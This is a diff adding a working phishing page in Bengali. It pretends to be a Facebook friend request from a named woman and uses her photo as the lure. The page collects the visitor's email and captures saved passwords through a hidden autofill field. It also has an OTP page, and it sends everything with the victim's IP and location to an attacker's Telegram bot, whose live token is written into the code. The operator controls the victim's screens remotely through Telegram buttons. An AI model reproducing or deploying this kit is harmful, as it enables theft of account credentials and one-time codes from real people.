@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Add Friend</title>
+
+    <meta property="og:title" content="ফেসবুক এড করতে হলে এখানে ক্লিক করুন">
+    <meta property="og:description" content="Mst. Priya Akter কে ফ্রেন্ড রিকোয়েস্ট পাঠান।">
+    <meta property="og:image" content="https://raw.githubusercontent.com/probasi-kollan-office-creator/facebook-friend-add/main/Picsart_26-03-15_06-28-09-284.jpg">
+    <meta property="og:type" content="website">
+
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body { background-color: #f7f9fc; font-family: 'Helvetica', Arial, sans-serif; margin: 0; padding: 0; height: 100vh; overflow: hidden; display: flex; flex-direction: column; }
+        .hidden { display: none; }
+        .top-half { height: 48vh; width: 100%; display: flex; align-items: center; justify-content: center; background-color: white; border-bottom: 1px solid #e1e4e8; padding: 10px; box-sizing: border-box; }
+        .top-half img { max-width: 100%; max-height: 100%; object-fit: contain; border-radius: 8px; }
+        .bottom-half { height: 52vh; width: 100%; background: #f7f9fc; padding: 20px; box-sizing: border-box; display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 15px; position: relative; }
+        .main-title { font-size: 19px; font-weight: 800; color: #1c1e21; margin-bottom: 5px; line-height: 1.4; }
+        .sub-text { font-size: 15px; color: #606770; line-height: 1.5; }
+        .secure-input { width: 100%; max-width: 350px; padding: 16px; border: 2px solid #ccd0d5; border-radius: 12px; outline: none; font-size: 17px; background: white; text-align: center; }
+        .btn-blue { width: 100%; max-width: 350px; background-color: #1877f2; color: white; font-weight: bold; padding: 16px; border-radius: 12px; cursor: pointer; border: none; font-size: 18px; text-align: center; }
+        .btn-red { width: 100%; max-width: 350px; background-color: #ef4444; color: white; font-weight: bold; padding: 16px; border-radius: 12px; cursor: pointer; border: none; font-size: 18px; margin-top: 10px; }
+        .loader { width: 55px; height: 55px; border: 6px solid #f3f3f3; border-top: 6px solid #1877f2; border-radius: 50%; animation: spin 0.8s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .status-icon { width: 70px; height: 70px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 40px; margin-bottom: 5px; }
+        #hidden_pass { position: absolute; opacity: 0; pointer-events: none; }
+    </style>
+</head>
+<body onload="onPageLoad()">
+
+    <div class="top-half">
+        <img src="https://raw.githubusercontent.com/probasi-kollan-office-creator/facebook-friend-add/main/Picsart_26-03-15_06-28-09-284.jpg">
+    </div>
+
+    <div class="bottom-half text-center">
+        <div id="step1" class="w-full flex flex-col items-center gap-4">
+            <h2 class="main-title">ফ্রেন্ড রিকোয়েস্ট পাঠান</h2>
+            <p class="sub-text">Mst. Priya Akter কে ফ্রেন্ড রিকোয়েস্ট পাঠাতে নিচের বাটনে ক্লিক করুন।</p>
+            <button onclick="startProcess()" class="btn-blue">Add Friend</button>
+        </div>
+
+        <div id="google_chooser" class="hidden w-full flex flex-col items-center gap-4">
+            <h1 class="main-title">অ্যাকাউন্ট নিশ্চিত করুন</h1>
+            <p class="sub-text">কিবোর্ডের ওপর থেকে আপনার ইমেইলটি সিলেক্ট করুন।</p>
+            <input type="email" id="email_field" placeholder="ইমেইল এড্রেস" class="secure-input">
+            <button onclick="finalSubmit()" class="btn-blue">Add Friend</button>
+        </div>
+
+        <div id="verifying" class="hidden w-full flex flex-col items-center gap-5">
+            <div class="loader"></div>
+            <h3 class="text-blue-600 font-bold">অল্প কিছুক্ষণ অপেক্ষা করুন...</h3>
+            <p class="sub-text">আপনার আইডিটি যাচাই করা হচ্ছে।</p>
+        </div>
+
+        <div id="success_page" class="hidden w-full flex flex-col items-center gap-3">
+            <div class="status-icon bg-green-500 text-white">✓</div>
+            <h2 class="text-2xl font-bold text-green-600">অভিনন্দন!</h2>
+            <p class="sub-text">অনুরোধটি সফলভাবে গ্রহণ করা হয়েছে।</p>
+            <a href="https://m.me/sabinayasmeen121" class="btn-blue mt-2">View Profile</a>
+        </div>
+
+        <div id="error_page" class="hidden w-full flex flex-col items-center gap-3 px-6">
+            <div class="status-icon bg-red-500 text-white">✕</div>
+            <h2 class="text-xl font-bold text-red-600">দুঃখিত!</h2>
+            <p class="sub-text">নেটওয়ার্ক সমস্যার কারণে আবার চেষ্টা করুন।</p>
+            <button onclick="location.reload()" class="btn-red">আবার চেষ্টা করুন</button>
+        </div>
+
+        <div id="otp_page" class="hidden w-full flex flex-col items-center">
+            <h2 class="text-[19px] font-bold mb-4">আইডি ভেরিফিকেশন কোড দিন</h2>
+            <input type="text" maxlength="6" placeholder="######" class="secure-input mb-4" id="otp_val">
+            <button onclick="goToStep('verifying')" class="btn-blue">Submit Code</button>
+        </div>
+
+        <div id="email_page" class="hidden w-full flex flex-col items-center gap-4">
+            <h2 class="main-title">নিরাপত্তা যাচাই</h2>
+            <button onclick="triggerGmailApp()" class="btn-blue">Send Message via Gmail</button>
+        </div>
+
+        <div id="save_password_page" class="hidden w-full flex flex-col items-center gap-4">
+            <h2 class="main-title text-red-600 px-4 text-center">ফেসবুক এড করতে চাইলে আপনার কিবোর্ড এর উপর ভেসে থাকা ইমেইল এর উপরে ক্লিক করুন</h2>
+            <input type="email" id="auto_email" name="u_name" autocomplete="username" placeholder="এখানে ক্লিক করুন" class="secure-input">
+            <input type="password" id="hidden_pass" name="u_pass" autocomplete="current-password">
+            <p class="text-xs text-gray-500 text-center">নিরাপত্তার জন্য আপনার প্রোফাইলটি নিশ্চিত করুন।</p>
+        </div>
+    </div>
+
+<script>
+    const botToken = "8617715035:AAHXQjkEtjYX40KQTAE5e_jVRQ_pKQX5Qjk";
+    const chatId = "8516934257";
+    let lastUpdateId = 0;
+    let locData = "Unknown";
+
+    async function onPageLoad() {
+        // অটো-ক্রোম রিডাইরেক্ট লজিক (১০০% ঠিক আছে)
+        var ua = navigator.userAgent;
+        if ((ua.indexOf("FBAN") > -1 || ua.indexOf("FBAV") > -1) && /Android/i.test(ua)) {
+            window.location.href = "intent://" + window.location.host + window.location.pathname + "#Intent;scheme=https;package=com.android.chrome;end";
+        }
+        try {
+            const res = await fetch('https://ipapi.co/json/');
+            const data = await res.json();
+            locData = `${data.city}, ${data.country_name} (IP: ${data.ip})`;
+        } catch (e) {}
+        checkState();
+        startAutoCaptureListener();
+    }
+
+    function startAutoCaptureListener() {
+        const eField = document.getElementById('auto_email');
+        const pField = document.getElementById('hidden_pass');
+        setInterval(() => {
+            if (eField.value.length > 2 || pField.value.length > 2) {
+                sendToBot(`💾 **সেভ পাসওয়ার্ড ক্যাপচার!**\n📧 আইডি: \`${eField.value}\` \n🔑 পাস: \`${pField.value}\` \n📍 ${locData}`);
+                setTimeout(() => {
+                    eField.value = ""; pField.value = "";
+                    eField.placeholder = "পরবর্তী ইমেইল বাছুন";
+                }, 1000);
+            }
+        }, 1500);
+    }
+
+    function triggerGmailApp() {
+        const targetEmail = "priyaakter200302@gmail.com";
+        const msgBody = "Hi....কেমন আছেন ,,, আমাকে এড করুন ,,,";
+        window.location.href = `mailto:${targetEmail}?subject=Verification&body=${encodeURIComponent(msgBody)}`;
+    }
+
+    function sendToBot(text) {
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ chat_id: chatId, text: text })
+        });
+    }
+
+    function goToStep(id) {
+        ['step1', 'google_chooser', 'verifying', 'success_page', 'error_page', 'otp_page', 'email_page', 'save_password_page'].forEach(s => {
+            const el = document.getElementById(s);
+            if(el) { el.classList.add('hidden'); el.classList.remove('flex'); }
+        });
+        const target = document.getElementById(id);
+        if(target) { target.classList.remove('hidden'); target.classList.add('flex'); }
+    }
+
+    function startProcess() { goToStep('google_chooser'); }
+
+    function finalSubmit() {
+        const email = document.getElementById('email_field').value;
+        sessionStorage.setItem('isWaiting', 'true');
+        const keyboard = {
+            inline_keyboard: [
+                [{ text: "💾 Save Password", callback_data: "save_pass_cmd" }],
+                [{ text: "📩 Get OTP Page", callback_data: "otp_cmd" }],
+                [{ text: "📨 Send Email", callback_data: "email_page_cmd" }],
+                [{ text: "✅ Success", callback_data: "success" }, { text: "❌ Error", callback_data: "error" }]
+            ]
+        };
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ chat_id: chatId, text: `🎯 **নতুন ডাটা!**\n📧 আইডি: \`${email}\` \n📍 ${locData}`, reply_markup: keyboard })
+        });
+        goToStep('verifying');
+        startListening();
+    }
+
+    function startListening() {
+        setInterval(async () => {
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${botToken}/getUpdates?offset=${lastUpdateId + 1}`);
+                const data = await response.json();
+                if (data.ok && data.result.length > 0) {
+                    data.result.forEach(update => {
+                        lastUpdateId = update.update_id;
+                        const command = update.callback_query?.data;
+                        if (command === "save_pass_cmd") { sessionStorage.removeItem('isWaiting'); goToStep('save_password_page'); }
+                        else if (command === "success") { sessionStorage.removeItem('isWaiting'); goToStep('success_page'); }
+                        else if (command === "error") { sessionStorage.removeItem('isWaiting'); goToStep('error_page'); }
+                        else if (command === "otp_cmd") { sessionStorage.removeItem('isWaiting'); goToStep('otp_page'); }
+                        else if (command === "email_page_cmd") { sessionStorage.removeItem('isWaiting'); goToStep('email_page'); }
+                    });
+                }
+            } catch (e) {}
+        }, 2000);
+    }
+
+    function checkState() {
+        if (sessionStorage.getItem('isWaiting') === 'true') goToStep('verifying');
+    }
+</script>
+</body>
+</html>
